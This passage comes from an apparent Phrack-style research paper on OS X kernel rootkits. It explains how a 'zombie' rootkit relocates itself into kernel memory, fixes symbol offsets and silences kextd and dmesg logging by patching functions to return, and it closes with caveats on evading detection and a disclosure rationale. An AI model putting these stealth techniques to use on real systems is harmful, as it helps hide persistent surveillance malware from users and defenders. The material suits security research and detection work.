control to zombie, second we can use kernel threads - create a new thread
and let the main one return.

To create a kernel thread the function kernel_thread_start() can be used
(include <kern/thread.h> and Mach KPI). Its prototype is:

kern_return_t
kernel_thread_start(thread_continue_t continuation, void *parameter,
thread_t *new_thread);

Continuation parameter is a C function pointer where new thread will start
execution, parameter is data that we might want to pass to the new thread,
and new_thread a thread reference that the caller is responsible for.

The zombie thread start function should have a prototype like this:

void start_thread(void *parameter, wait_result_t wait)

To set the start function pointer we need to find that function address
in the zombie memory. Symbol information is not available (__LINKEDIT
segment is not loaded) and to avoid reading from the filesystem we can
use a quick trick - find the rootkit base address and find the difference
to the address of start function in the rootkit (since that is in the
original rootkit code). Since we have the zombie start address returned
from the memory allocation, we just need to add the difference and we
have the location of the start function inside the zombie. Computed the
function pointer we can now pass it to kernel_thread_start() and be sure
that zombie code will execute.

Next problem...

Copying the original rootkit into the new area invalidates the external
symbols solved when kernel extension was loaded. Kernel extension code
is position independent (PIC) so calls are made referencing the current
instruction address. If we modify the location address and maintain
the offset, then the symbol is not valid anymore and most probably will
generate a kernel panic when executed.

Example:
Rootkit loaded in memory:
gdb$ x/10i 0xffffff7f83ad671c
0xffffff7f83ad671c:  55                        push   rbp
0xffffff7f83ad671d:  48 89 e5                  mov    rbp,rsp
0xffffff7f83ad6720:  48 8d 3d d1 09 00 00      lea    rdi,[rip+0x9d1]
# 0xffffff7f83ad70f8 <- string reference
0xffffff7f83ad6727:  30 c0                     xor    al,al
0xffffff7f83ad6729:  5d                        pop    rbp
0xffffff7f83ad672a:  e9 61 29 35 7f            jmp    0xffffff8002e29090 <-
call to kernel's printf, solved when kext was loaded

The zombie copy:
gdb$ x/10i 0xffffff80392ba724
0xffffff80392ba724:  55                        push   rbp
0xffffff80392ba725:  48 89 e5                  mov    rbp,rsp
0xffffff80392ba728:  48 8d 3d d1 09 00 00      lea    rdi,[rip+0x9d1]
# 0xffffff80392bb100 <- string reference will be valid
0xffffff80392ba72f:  30 c0                     xor    al,al
0xffffff80392ba731:  5d                        pop    rbp
0xffffff80392ba732:  e9 61 29 35 7f            jmp    0xffffff80b860d098 <-
this is a random address and will crash when we call this Function

I am not sure if there is a better solution but I opted out to manually
fix the offsets in the zombie code (probably influenced by the quick
trick to find the thread start function). My idea is to build a table
of all external symbols we will need to fix (hardcoded string table or
read kext symbol tables from disk) and solve their addresses. With this
information we can disassemble the kernel and find all references, and
also compute the (references's) difference to the rootkit base address.

The final step is to fix the offsets in the zombie references. We
have the difference for each reference so we can calculate where each
reference is located in the zombie memory and recompute the new offset
to the external symbol. References to the __DATA segment do not need to
be fixed - the offsets remain valid since that segment was copied and
relative distance remains the same. Maybe a bit too much work but the
disassembler engine makes this rather easy to accomplish. If you have
a better solution I am eager to read about it.

Returning KERN_FAILURE to kextload will generate noisy log messages
about the rootkit.

/var/log/system.log:
May  7 02:26:10 mountain-lion-64.local com.apple.kextd[12]: Failed to load
/Users/reverser/the_flying_circus.kext - (libkern/kext) kext (kmod)
start/stop routine failed.

dmesg:
Kext put.as.the-flying-circus start failed (result 0x5).
Kext put.as.the-flying-circus failed to load (0xdc008017).
Failed to load kext put.as.the-flying-circus (error 0xdc008017).

The dmesg output can be silenced by temporarily patching OSKextLog
function or by directly memory patching the binaries that call this
function. The fastest and easiest way is to do it inside the kernel -
solve the symbol and patch the first instruction to a ret. After rootkit
is loaded we can restore original byte and everything is back to normal.

The syslog output is generated by kextd daemon. Two quick solutions
come to my mind - one is to patch syslogd as described before, another
is to patch kextd. The symbol used to send the message to syslogd
is asl_vlog. It is an external symbol in kextd. The symbol stub can
be temporarily patched into a ret to avoid failure logging. Find the
kextd process from process list, process its Mach-O header and locate
the symbol stub address in __stubs section. Nothing very complicated!

To detect when to restore the logging features, we can use a quick and
dirty hack. Loop inside the zombie thread until kextload process is
finished. Then the original bytes can be restored and its business as
usual but with a zombie rootkit loaded.

The foundation blocks to zombie rootkits are exposed, the remaining are
implementation details that do not matter much here and can be found in
the attached sample code.


--[ 7 - Caveats & Detection

Writing rootkits is a dangerous and unstable game and that is why it is
such a fun game (or work for those doing it for money). You are always
at mercy of subtle or major changes that can ruin all your efforts and
uncloak your toy. Nevertheless, these are the same reasons why writing
rootkits is so fun - you need to make it as stable and future-proof
as possible, and try to think in all different detection paths. It
is a never-ending story, quite frustrating at times but mentally and
creatively challenging.

This paper is considerably huge but still incomplete! There are a few
missing areas and you probably spotted a few problems with some of its
approaches. Let me try to describe some.

One of the main problems is the dependency on proc, task and some other
structures. These are opaque to outsiders for one good reason - they
are changed frequently between major OS X versions. For example, when I
was researching I forgot to include a define and things were not working
(lucky or not it was not crashing the test system). Three different proc_t
(and task_t) versions must be included to create a rootkit compatible
with the three latest major OS X versions. And it is most certain that
it will break with a new major release.

In practice there is at least one rather easy way to overcome this
difficulty. The effective number of fields required from proc and task
structures is small. We can resort to information "leaks" from functions
referencing those fields and retrieve the structure offset. Including a
disassembler in the rootkit makes this task easier and safer. There are
many suitable functions - small, stable, and with very few different
structures and variables. Many are static, but the number of exported
ones are more than enough for this purpose.

Filesystem checks (offline in particular) are a significant threat
to rootkits, especially when there is a good reference baseline. Good
rootkits must try to keep their filesystem (and memory) footprint to a
minimum. One of the usual weakest points is the rootkit startup. It must
be initialised somewhere! OS X features so many places where this can
happen but this information is available to both defensive and offensive
sides. Binaries modification (for example, kernel extension injection
as featured in last Phrack) is a good method but (easily) detectable by
checksum checks.

Regarding this problem, we can try to abuse additional features. OS X
contains many data files that are mutable (sqlite3 databases, for example)
and by nature difficult to checksum. A potential vulnerability using
these data files could be explored and all the rootkit code stored
there. Nothing new here, just remembering additional attacking and
storage points.

Extreme care is required with rootkit's code - it must be as bug free
as possible so that any inconsistencies and/or bugs do not reveal its
presence, and must be carefully designed, for example, authentication
and encryption on all communications. It is quite a joke that a simple
ioctl call can expose OS.X/Crisis [4]. There is a "rule" - if it runs,
it can be reversed. But lets not make that so easy, ok?

Duplicating functions to use with the trampoline trick is also a
potential source of problems if those functions are changed in new
versions. This can be avoided by using the original functions - modify
the call references or hijack the function and return to the original
one. Using the NOP alignment space allows us to keep pointers and
references inside the kernel memory address space and less suspicious
to an initial analysis.

Detection and creation of tools is the next logical step. OS X lacks this
kind of tools and here lies a good opportunity for future research and
development. The defensive side against rootkits is even more challenging
and requires additional creativity (and maybe kernel knowledge) to
develop safer and reliable detection methods. The challenge is issued :-).


--[ 8 - Final words

This was a long paper and I sincerely hope it was useful in some way
to you who had the time and patience to read it. New ideas are hard to
come by and there (probably) are many here that were somehow previously
explored by others. Please apologize me if missing attribution - it
is only because I do not know or I am not aware who is the original
author/source. It is particularly difficult when you read so much stuff
thru the years.

The full disclosure discussion is extremely complicated and impossible to
reach consensus. Full source code is hereby released because I believe
it is the only (viable) alternative to move things forward and call
for additional research and solutions. OS X is a great platform but it
(still) suffers from a invincibility mystique that it is false and
dangerous. There are companies producing commercial rootkits sold to
governments to potentially spy on citizens (they say criminals, we have
no idea since there is no transparency).

Obviously these  tools can be used for legitimate purposes (such as
tracking real bad guys) but also no so legitimate - power corrupts and
temptation is too big to spy and control everyone. A balance is required
and it can come from improved research and defensive tools. Scoffing
at the low incentives or potential difficulties is not the solution -
history has shown that there is always someone who will leap forward
and break the establishment.

This paper's goal is not to assist in developing a surveillance dissident
death machine (name kindly suggested by thegrugq!) but to show the
different ways it can be built, and how to detect and protect against
them. I can't avoid its potential bad usage but at least it should make
the playing field a bit more balanced.

Greets to nemo, noar, snare, all my put.as friends (saure, od, spico,
kahuna, emptydir, korn, g0sh, ...), thegrugq, diff-t, tal0n and everyone
else at C., the blog readers and #osxre boys & girls.

And a big middle finger to Apple as a company, born from the hacking
spirit and now transformed against hacking.

Enjoy & have fun,
fG!
